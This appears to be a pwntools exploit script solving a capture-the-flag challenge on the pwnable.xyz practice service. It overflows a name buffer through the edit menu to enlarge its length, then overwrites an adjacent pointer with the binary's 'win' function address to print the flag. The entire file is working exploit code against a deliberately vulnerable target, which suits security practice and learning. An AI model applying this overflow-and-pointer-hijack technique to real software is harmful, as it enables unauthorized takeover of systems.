from pwn import *


context(kernel="amd64", arch="amd64", log_level="info")

# catalog

"""
Menu:
 1. Write name
 2. Edit name
 3. Print name
 0. Exit
> 0
"""

def menu(proc, choose):
	# proc.recvuntil(b"> ")
	# proc.sendline(str(choose).encode("utf-8"))
	proc.sendlineafter(b"> ", str(choose).encode("utf-8"))

def write_name(proc, name):
	menu(proc, 1)
	proc.sendafter(b"name: ", name)

def edit_name(proc, name_n, new_name):
	menu(proc, 2)
	proc.sendafter(b"index: ", str(name_n).encode("utf-8"))
	proc.sendafter(b"name: ", new_name)

def print_name(proc, name_n):
	menu(proc, 3)
	proc.sendafter(b"index: ", str(name_n).encode("utf-8"))
	data = proc.recv(numb=6) # proc.recvuntil(b"name: ")
	name = b""
	if data != b"name: ":
		name += data
	name += proc.recvuntil(b"Menu")
	return name[:-4]




def main():
	e = ELF("challenge")
	if 0:
		p = process("./challenge")
		# gdb.attach(p)
	elif 0:
		p = process(["strace", "-o", "strace.out", "./challenge"])
	else:
		p = remote("svc.pwnable.xyz", 30023)

	win_addr = e.symbols["win"]

	write_name(p, b"A"*0x20)
	edit_name(p, 0, b"A"*0x20+b"\xff")
	edit_name(p, 0, b"A"*0x20+b"B"*8+pack(win_addr))
	mine_name = print_name(p, 0)
	print(f"[+] Flag is: {mine_name.decode('utf-8')}")
	menu(p, 0)



main()